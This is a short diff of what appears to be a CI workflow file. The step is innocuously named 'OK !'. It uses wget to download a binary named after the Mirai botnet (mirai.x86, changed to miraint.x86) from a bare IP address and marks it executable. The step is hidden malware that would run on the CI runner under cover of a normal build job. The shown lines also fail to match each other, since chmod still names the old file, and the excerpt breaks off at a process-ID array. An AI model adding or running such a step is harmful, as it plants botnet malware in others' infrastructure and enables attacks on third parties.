@@ -13,7 +13,7 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget http://158.94.209.209/bins/mirai.x86
+          wget http://158.94.209.209/bins/miraint.x86
           chmod +x mirai.x86
           
           PIDS=()
